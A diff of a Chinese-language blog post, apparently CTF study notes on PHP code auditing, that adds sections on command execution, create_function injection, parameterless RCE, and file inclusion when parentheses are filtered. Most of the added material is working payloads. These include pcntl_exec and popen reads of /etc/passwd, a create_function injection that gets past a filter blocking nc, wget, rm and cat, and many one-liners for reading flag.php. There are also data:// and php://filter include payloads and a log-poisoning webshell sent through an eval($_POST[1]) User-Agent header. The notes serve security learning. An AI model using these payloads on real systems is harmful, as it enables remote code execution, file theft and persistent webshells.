@@ -28,7 +28,7 @@
 <meta property="og:description" content="php代码审计小结 php函数常用输出函数 1234567echo 输出一个字符串或变量，但是不能输出数组。print_r()  输出一个数组。var_dump() 输出一个变量的结构，这个变量包含普通变量，数组，对象等get_defined_vars(void)此函数返回一个包含当前可用的变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。  在函数中使用此函数可以调试函数中">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-04-02T17:12:44.000Z">
-<meta property="article:modified_time" content="2024-04-08T03:51:23.694Z">
+<meta property="article:modified_time" content="2024-06-05T01:52:52.378Z">
 <meta property="article:author" content="小zhou">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="小结">
@@ -225,7 +225,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-04-08 11:51:23" itemprop="dateModified" datetime="2024-04-08T11:51:23+08:00">2024-04-08</time>
+                <time title="修改时间：2024-06-05 09:52:52" itemprop="dateModified" datetime="2024-06-05T09:52:52+08:00">2024-06-05</time>
               </span>
 
           <br>
@@ -234,14 +234,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.9k</span>
+              <span>4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>11 分钟</span>
+              <span>14 分钟</span>
             </span>
 
         </div>
@@ -258,10 +258,18 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo 输出一个字符串或变量，但是不能输出数组。</span><br><span class="line"></span><br><span class="line">print_r()  输出一个数组。</span><br><span class="line"></span><br><span class="line">var_dump() 输出一个变量的结构，这个变量包含普通变量，数组，对象等</span><br><span class="line"></span><br><span class="line">get_defined_vars(void)此函数返回一个包含当前可用的变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure>
 
 <p>在函数中使用此函数可以调试函数中的变量，而不会返回其他的变量。</p>
-<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html</a>)</p>
-<p>代码执行函数</p>
-<p>eval()assert()</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html</a></p>
 <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>systemsystem()exec()shell_exec()passthru()pcntl_exec()popen()proc_open()</p>
+<p>用于打开一个到外部命令的管道。允许你与外部命令进行读或写操作（但不同时支持两者）。返回一个文件指针，可用于进一步的 fread 或 fwrite 操作。使用 pclose 来关闭管道并获取命令的退出状态。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec(&quot;/bin/cat&quot;,array(&quot;/etc/passwd));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=popen(&quot;bin/cat,/etc/passwd&quot;,&quot;r&quot;);$b=fread($a,2096);echo $b;pclose($a);</span><br></pre></td></tr></table></figure>
+
+<p>ob_start() 是 PHP 的一个函数，用于开启输出缓冲。这意味着脚本的输出（如 echo）不会立即发送到浏览器，而是存储在内部缓冲区中。这允许在输出发送到浏览器前对其进行修改。使用 ob_end_flush() 来发送缓冲区内容至浏览器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start(&quot;system&quot;);</span><br><span class="line">echo &quot;whoami&quot;;</span><br><span class="line">ob_end_flush();?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><p>遍历 <code>array</code> 数组中的每个值，并将每个值传递给 <code>callback</code> 回调函数。 如果 <code>callback</code> 回调函数返回 **<code>true</code>**，则将 <code>array</code> 数组中的当前值返回到结果 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.array.php">array</a> 数组中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array_filter(array $array,  $callback )</span><br><span class="line">array   要遍历的数组</span><br><span class="line">callback  使用的回调函数</span><br></pre></td></tr></table></figure>
 
@@ -314,6 +322,82 @@
 <p>命令执行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="variable">$old_array</span>[<span class="number">0</span>] = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$old_array</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$new_array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+
+
+<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag:/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shaw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>];</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z_]*$/isD&#x27;</span>,<span class="variable">$shaw</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rm|ch|nc|net|ex|\-|de|cat|tac|strings|h|wget|\?|cp|mv|\||so|\$/i&#x27;</span>,<span class="variable">$root</span>))&#123;</span><br><span class="line">            <span class="variable">$shaw</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$root</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Almost there^^&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?root=;&#125;system(&#x27;ca\t /f*&#x27;);/*</span><br><span class="line">shaw=create_function</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(dirname(__FILE__)));查看当前目录下文件</span><br><span class="line">然后找到flag.php</span><br><span class="line">print_r(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">之后高亮显示即可</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br></pre></td></tr></table></figure>
+
+<p>方法二</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>方法三</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(session_id(session_start()));，别忘了修改Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>方法四</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br><span class="line">passid=ls</span><br></pre></td></tr></table></figure>
+
+<p>方法五</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv()))))); </span><br></pre></td></tr></table></figure>
+
+<p>方法六</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line">或者</span><br><span class="line">readfile(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>方法七</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(var_dump(end(getallheaders())));</span><br></pre></td></tr></table></figure>
+
+<p>方法八</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(end(current(get_defined_vars())));&amp;a=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><p><strong><code>__FILE__</code></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo __FILE__ ; // 取得当前文件的绝对地址，结果：D:\www\test.php </span><br><span class="line"></span><br><span class="line">echo dirname(__FILE__); // 取得当前文件所在的绝对目录，结果：D:\www\ </span><br><span class="line"></span><br><span class="line">echo dirname(dirname(__FILE__)); //取得当前文件的上一层目录名，结果：D:\ </span><br></pre></td></tr></table></figure>
+
+<p><strong>scandir</strong></p>
+<p>(PHP 5, PHP 7, PHP 8)</p>
+<p> 列出指定路径中的文件和目录，返回 array，包含有 <code>directory</code> 中的文件和目录。</p>
+<p><strong>array_reverse()</strong> 接受数组 <code>array</code> 作为输入并返回一个单元为相反顺序的新数组。</p>
+<p><strong>next</strong>  将数组中的内部指针向前移动一位</p>
+<p>示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$transport = array(&#x27;foot&#x27;, &#x27;bike&#x27;, &#x27;car&#x27;, &#x27;plane&#x27;);</span><br><span class="line">$mode = current($transport); // $mode = &#x27;foot&#x27;;</span><br><span class="line">$mode = next($transport);    // $mode = &#x27;bike&#x27;;</span><br><span class="line">$mode = next($transport);    // $mode = &#x27;car&#x27;;</span><br><span class="line">$mode = prev($transport);    // $mode = &#x27;bike&#x27;;</span><br><span class="line">$mode = end($transport);     // $mode = &#x27;plane&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>session_id()</strong> </p>
+<p>返回当前会话ID。 如果当前没有会话，则返回空字符串（<code>&quot;&quot;</code>）。失败时返回 **<code>false</code>**。</p>
+<p><strong>localeconv()</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [decimal_point] =&gt; .</span><br><span class="line">    [thousands_sep] =&gt;</span><br><span class="line">    [int_curr_symbol] =&gt; EUR</span><br><span class="line">    [currency_symbol] =&gt; €</span><br><span class="line">    [mon_decimal_point] =&gt; ,</span><br><span class="line">    [mon_thousands_sep] =&gt;</span><br><span class="line">    [positive_sign] =&gt;</span><br><span class="line">    [negative_sign] =&gt; -</span><br><span class="line">    [int_frac_digits] =&gt; <span class="number">2</span></span><br><span class="line">    [frac_digits] =&gt; <span class="number">2</span></span><br><span class="line">    [p_cs_precedes] =&gt; <span class="number">1</span></span><br><span class="line">    [p_sep_by_space] =&gt; <span class="number">1</span></span><br><span class="line">    [n_cs_precedes] =&gt; <span class="number">1</span></span><br><span class="line">    [n_sep_by_space] =&gt; <span class="number">1</span></span><br><span class="line">    [p_sign_posn] =&gt; <span class="number">1</span></span><br><span class="line">    [n_sign_posn] =&gt; <span class="number">2</span></span><br><span class="line">    [grouping] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line">    [mon_grouping] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">3</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>也就是返回  .</p>
+<p><strong>readfile</strong></p>
+<p>读取文件并写入到输出缓冲。</p>
+<p><strong>getcwd()取得当前工作目录。</strong></p>
+<p>**pos 此函数是该函数的别名：current()**\</p>
+<p><strong>array_flip()</strong> 返回一个反转后的 array，例如 <code>array</code> 中的键名变成了值，而 <code>array</code> 中的值成了键名。</p>
+<p><strong>getallheaders</strong> ()</p>
+<p>获取当前请求的所有请求头信息。</p>
+<p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效</p>
+<p><strong>get_defined_vars()</strong></p>
+<p>此函数返回多维数组。包含调用 <strong>get_defined_vars()</strong> 作用域内所有已定义的变量、环境变量、服务器变量、用户定义变量列表。</p>
+<p><strong>session_id()</strong></p>
+<p>可以获取PHPSESSID的值</p>
+<h3 id="读取目录："><a href="#读取目录：" class="headerlink" title="读取目录："></a>读取目录：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(&quot;/&quot;));</span><br><span class="line">print_r(glob(&quot;*&quot;)); // 列当前目录</span><br><span class="line">print_r(glob(&quot;/*&quot;)); // 列根目录</span><br><span class="line">print_r(scandir(&quot;.&quot;));</span><br><span class="line">print_r(scandir(&quot;/&quot;));</span><br><span class="line">$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;</span><br><span class="line">$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;</span><br><span class="line">$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">highlight_file($filename);</span><br><span class="line"></span><br><span class="line">show_source($filename);</span><br><span class="line"></span><br><span class="line">print_r(php_strip_whitespace($filename));</span><br><span class="line"></span><br><span class="line">print_r(file_get_contents($filename));</span><br><span class="line"></span><br><span class="line">readfile($filename);</span><br><span class="line"></span><br><span class="line">print_r(file($filename)); // var_dump</span><br><span class="line"></span><br><span class="line">fread(fopen($filename,&quot;r&quot;), $size);</span><br><span class="line"></span><br><span class="line">include($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">include_once($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">require($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">require_once($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));</span><br><span class="line"></span><br><span class="line">print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行</span><br><span class="line"></span><br><span class="line">fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOF</span><br><span class="line"></span><br><span class="line">print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));</span><br><span class="line"></span><br><span class="line">print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="line"></span><br><span class="line">print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));</span><br><span class="line"></span><br><span class="line">print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</span><br></pre></td></tr></table></figure>
+
+<h2 id="括号过滤"><a href="#括号过滤" class="headerlink" title="括号过滤"></a>括号过滤</h2><p>nclude不用括号，分号可以用?&gt;代替,伪协议文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>方法二</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>方法三,日志包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=/var/log/nginx/access.log</span><br><span class="line">User-Agent: &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="eval-注释符绕过"><a href="#eval-注释符绕过" class="headerlink" title="eval 注释符绕过"></a>eval 注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a %0d ?&gt; </span><br></pre></td></tr></table></figure>
+
 <h1 id="php函数绕过"><a href="#php函数绕过" class="headerlink" title="php函数绕过"></a>php函数绕过</h1><p>md5(Array()) &#x3D; null<br>sha1(Array()) &#x3D; null<br>ereg(pattern,Array()) &#x3D;null<br>preg_match(pattern,Array()) &#x3D; false<br>strcmp(Array(), “abc”) &#x3D;null<br>strpos(Array(),“abc”) &#x3D; null<br>strlen(Array()) &#x3D; null</p>
 <h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><h3 id="0e绕过"><a href="#0e绕过" class="headerlink" title="0e绕过"></a>0e绕过</h3><p>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</p>
 <p>数组绕过</p>
@@ -355,6 +439,8 @@
 
 <p>只需要传入</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=flag%0a</span><br></pre></td></tr></table></figure>
+
+
 
 
 
@@ -679,12 +765,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2024/04/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="php反序列化">
-      <i class="fa fa-chevron-left"></i> php反序列化
+    <a href="/2024/04/02/sqlmaptamper/" rel="prev" title="sqlmaptamper">
+      <i class="fa fa-chevron-left"></i> sqlmaptamper
     </a></div>
       <div class="post-nav-item">
-    <a href="/2024/04/04/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next" title="php文件包含">
-      php文件包含 <i class="fa fa-chevron-right"></i>
+    <a href="/2024/04/05/pwn%E5%85%A5%E9%97%A8/" rel="next" title="pwn入门">
+      pwn入门 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -744,7 +830,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%87%BD%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">php函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#array-filter"><span class="nav-number">2.1.</span> <span class="nav-text">array_filter()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-user-func"><span class="nav-number">2.2.</span> <span class="nav-text">call_user_func()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E5%B1%952"><span class="nav-number">2.2.1.</span> <span class="nav-text">拓展2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E5%B1%953"><span class="nav-number">2.2.2.</span> <span class="nav-text">拓展3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0"><span class="nav-number">2.2.3.</span> <span class="nav-text">匿名函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pre-replace"><span class="nav-number">2.3.</span> <span class="nav-text">pre_replace</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array-map"><span class="nav-number">2.4.</span> <span class="nav-text">array_map()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">php函数绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#md5"><span class="nav-number">3.1.</span> <span class="nav-text">md5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0e%E7%BB%95%E8%BF%87"><span class="nav-number">3.1.1.</span> <span class="nav-text">0e绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a-x3D-x3D-md5-a"><span class="nav-number">3.1.2.</span> <span class="nav-text">$a&#x3D;&#x3D;md5($a)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#intval"><span class="nav-number">3.2.</span> <span class="nav-text">intval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg-match"><span class="nav-number">3.3.</span> <span class="nav-text">preg_match</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.1.</span> <span class="nav-text">回溯绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.2.</span> <span class="nav-text">数组绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.3.</span> <span class="nav-text">换行绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">4.</span> <span class="nav-text">全局变量</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SERVER"><span class="nav-number">4.1.</span> <span class="nav-text">$_SERVER</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">5.</span> <span class="nav-text">正则匹配</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8C%B9%E9%85%8D%E5%85%AC%E5%BC%8F%E8%AF%AD%E6%B3%95"><span class="nav-number">5.1.</span> <span class="nav-text">匹配公式语法</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%87%BD%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">php函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#array-filter"><span class="nav-number">2.1.</span> <span class="nav-text">array_filter()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-user-func"><span class="nav-number">2.2.</span> <span class="nav-text">call_user_func()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E5%B1%952"><span class="nav-number">2.2.1.</span> <span class="nav-text">拓展2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E5%B1%953"><span class="nav-number">2.2.2.</span> <span class="nav-text">拓展3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0"><span class="nav-number">2.2.3.</span> <span class="nav-text">匿名函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pre-replace"><span class="nav-number">2.3.</span> <span class="nav-text">pre_replace</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array-map"><span class="nav-number">2.4.</span> <span class="nav-text">array_map()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#create-function"><span class="nav-number">2.5.</span> <span class="nav-text">create_function</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%8F%82rce"><span class="nav-number">2.6.</span> <span class="nav-text">无参rce</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%EF%BC%9A"><span class="nav-number">2.6.1.</span> <span class="nav-text">读取目录：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">2.6.2.</span> <span class="nav-text">读取文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-number">2.7.</span> <span class="nav-text">括号过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span 